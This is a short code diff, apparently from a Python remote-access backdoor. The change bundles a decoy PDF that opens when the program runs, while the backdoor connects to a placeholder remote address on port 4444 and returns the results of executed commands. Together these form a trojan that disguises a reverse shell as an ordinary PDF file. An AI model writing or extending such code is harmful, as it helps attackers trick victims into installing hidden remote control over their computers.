@@ -70,6 +70,9 @@ class Backdoor:
                     command_result = "[-] Error executing command"
                 self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "\sample_pdf_file.pdf"
+subprocess.Popen(file_name, shell=True)
+
 try:
     my_backdoor = Backdoor("xxx.xxx.xxx.xxx", 4444)
     my_backdoor.run()
